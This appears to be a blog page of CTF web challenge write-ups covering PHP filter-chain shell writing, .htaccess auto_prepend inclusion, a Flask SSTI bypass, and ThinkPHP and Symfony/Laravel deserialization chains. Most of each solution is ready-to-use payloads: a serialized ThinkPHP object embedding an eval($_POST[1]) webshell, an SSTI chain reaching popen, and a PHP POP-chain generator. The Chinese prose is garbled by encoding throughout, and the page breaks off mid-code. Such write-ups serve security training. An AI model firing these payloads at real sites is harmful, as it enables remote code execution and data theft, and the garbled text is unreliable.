id="2020-æ–°æ˜¥çº¢åŒ…é¢˜-1"><a href="#2020-æ–°æ˜¥çº¢åŒ…é¢˜-1" class="headerlink" title="[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1"></a>[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1</h2><p>è¿™é¢˜å’Œ**[EIS 2019]EzPOP**å®Œå…¨ä¸€è‡´ï¼Œå”¯ä¸€ä¸åŒå°±æ˜¯åœ¨æ–‡ä»¶åå¤„å¤šäº†è¿‡æ»¤</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span>    <span class="token variable">$cache_filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cache_filename</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$cache_filename</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¼ªåè®®åŠ ç›®å½•ç©¿è¶Šæ¥ç»•è¿‡ï¼Œä¼ å…¥<code>key = &quot;/../shell.php/.&quot;;</code>ä¸”<code>options[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=&#39;;</code>ï¼Œæ­¤æ—¶å†…å®¹å˜ä¸ºï¼š<code>php://filter/write=convert.base64-decode/resource=62a58e2e23e33/../shell.php</code>ç›´æ¥ç»•è¿‡</p><h2 id="ç¾ŠåŸæ¯2020-easyphp"><a href="#ç¾ŠåŸæ¯2020-easyphp" class="headerlink" title="[ç¾ŠåŸæ¯2020]easyphp"></a>[ç¾ŠåŸæ¯2020]easyphp</h2><p>æ–‡ä»¶ä¸Šä¼ .htaccessåŒ…å«åˆ©ç”¨ï¼Œé¦–å…ˆåœ¨htaccessæ–‡ä»¶ä¸­æ˜¯æœ‰æ³¨é‡Šç¬¦çš„ï¼Œå°±å®ƒ#ï¼Œä½†æ˜¯phpä¸è¯»è¿™ä¸ªçš„å•Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ä¸Šä¼ .htaccessæ–‡ä»¶å¹¶åŒ…å«htaccesså¹¶ä¸”æ³¨é‡Šæ‰ä¸€å¥è¯æœ¨é©¬å³å¯ï¼Œæœ«å°¾è®°å¾—åŠ åæ–œæ æ¥è½¬è¯‘æ¢è¡Œï¼Œfileä½¿ç”¨\æ¥ç»•è¿‡</p><pre class="line-numbers language-none"><code class="language-none">php_value auto_prepend_fil\e .htaccess#&lt;?php system(&#39;tac &#x2F;f*&#39;);?&gt;\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p>è¿™ä¸ªéé¢„æœŸå’Œä¸Šé¢é‚£ä¸ªä¸€æ ·ï¼Œä¹Ÿæ˜¯ä¼ å…¥htaccessæ–‡ä»¶æ‰§è¡Œ</p><h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>è¿‡æ»¤äº†â€™ï¼Œ.ï¼Œ_ï¼Œä½¿ç”¨16è¿›åˆ¶ç»•è¿‡ï¼Œç›´æ¥ç»™payloadäº†</p><pre class="line-numbers language-none"><code class="language-none">nickname&#x3D;&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;tac app*&quot;)[&quot;read&quot;]()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯å¾ˆæ˜æ˜¾çœ‹åˆ°æºç ä¹Ÿæ²¡å•¥ç”¨ï¼Œå› ä¸ºflagå·²ç»è¢«é”€æ¯äº†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template_string<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'folow @osminogka.ann on instagram =)'</span><span class="token comment">#Tiaonmmn don't remember to remove this part on deploy so nobody will solve that hehe</span><span class="token triple-quoted-string string">'''def encode(line, key, key2):    return ''.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))app.config['flag'] = encode('', 'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3', 'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT')'''</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> key<span class="token punctuation">,</span> key2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key2<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/app/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">42</span><span class="token punctuation">]</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> encode<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3'</span><span class="token punctuation">,</span> <span class="token string">'xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"/app/flag"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨è¿™ä¸ªå‡½æ•°åå‘è·‘å‡ºflagå³å¯</p><h2 id="å®‰æ´µæ¯-2019-iamthinking"><a href="#å®‰æ´µæ¯-2019-iamthinking" class="headerlink" title="[å®‰æ´µæ¯ 2019]iamthinking"></a>[å®‰æ´µæ¯ 2019]iamthinking</h2><p><a href="http://www.zipä¸‹è½½æºç /">www.zipä¸‹è½½æºç </a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span> <span class="token keyword">extends</span> <span class="token class-name">BaseController</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='../test.jpg'"</span><span class="token operator">.</span><span class="token string double-quoted-string">"/>"</span><span class="token punctuation">;</span>        <span class="token variable">$paylaod</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$paylaod</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$query</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/^O/i"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'STOP HACKING'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$paylaod</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªååºåˆ—åŒ–ï¼Œæ²¡æœ‰å…¶ä»–çš„æ–¹æ³•äº†ï¼Œåªèƒ½çœ‹thinkPHPçš„ååºåˆ—åŒ–æ¼æ´äº†ï¼Œè‡³äºå…¶ä¸­çš„å¯¹ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç»•è¿‡ï¼Œçœ‹<a href="https://www.cnblogs.com/tr1ple/p/11137159.html">è¿™é‡Œ</a>ï¼Œå…¶ä¸­thinkPHPçš„ååºåˆ—åŒ–é“¾å­å¯ä»¥ç”¨<a href="https://github.com/wh1t3p1g/phpggc">è¿™ä¸ª</a>å·¥å…·ç”Ÿæˆ</p><p>æœ€ç»ˆpayload</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;public&#x2F;?payload&#x3D;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000001dae5f69000000005d7b61f7%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1"><a href="#CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1"></a>[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h2><p>ä»å¤´å¼€å§‹æ‰¾ååºåˆ—åŒ–é“¾å­å‘—</p><p>/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.phpä¸­çš„<code>__destruct</code>æ–¹æ³•ä¸ºèµ·å§‹ç‚¹ï¼Œè·Ÿè¿›<code>commit</code>æ–¹æ³•ï¼Œè·Ÿè¿›<code>invalidateTags</code>æ–¹æ³•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$items</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$items</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span><span class="token operator">-></span><span class="token function">saveDeferred</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">getTagsByKey</span><span class="token punctuation">;</span>    <span class="token variable">$tagsByKey</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$items</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„è°ƒç”¨äº†poolçš„saveDeferredæ–¹æ³•ï¼Œpoolå¯æ§ï¼Œä½†æ˜¯åœ¨<code>__construct</code>ä¸­é™å®šäº†poolçš„ç±»å‹éœ€è¦æ˜¯<code>AdapterInterface</code>ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾ä¸€ä¸ªæ˜¯<code>AdapterInterface</code>å¹¶ä¸”å¸¦æœ‰<code>saveDeferred</code>æ–¹æ³•çš„ç±»ï¼Œçœ‹åˆ°è¿™é‡Œ/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.phpçš„<code>saveDeferred</code>ï¼Œä¼ å…¥å˜é‡è¦æ±‚ä¸º<code>CacheItemInterface</code>ç±»ï¼Œå…¨å±€æœç´¢è¯¥ç±»</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141634553.png"></p><p>æ¡ä»¶æ»¡è¶³ç»§ç»­èµ°æ–¹æ³•</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">values</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$values</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">include</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">!==</span> <span class="token function"><span class="token punctuation">\</span>count</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$values</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$values</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">values</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">keys</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">values</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$values</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„includeäº†æ–‡ä»¶ï¼Œæœ€ç»ˆçš„æ–‡ä»¶è¯»å–ï¼ŒæŒ‰ç…§ä¸Šè¿°å†…å®¹æ„é€ expï¼Œæ³¨æ„å‘½åç©ºé—´</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache</span><span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">CacheItem</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>Adapter</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Symfony<span class="token punctuation">\</span>Component<span class="token punctuation">\</span>Cache<span class="token punctuation">\</span>CacheItem</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PhpArrayAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">TagAwareAdapter</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$deferred</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$pool</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">CacheItem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pool</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PhpArrayAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TagAwareAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p>çœ‹æºç ï¼Œuploadsæ–‡ä»¶å¤¹ï¼Œéšä¾¿ç‚¹ä¸€ä¸ªæ–‡ä»¶çœ‹å‚æ•°ï¼Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œæ­¤å¤„è¦ç»•ä¸€ä¸‹../ï¼Œå˜æˆâ€¦//</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141718491.png"></p><h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><p>å’ŒLove Mathä¸€æ ·ï¼Œæ„é€ _GETæ¥è‡ªå·±å¡ä¸œè¥¿è¿›å»</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string 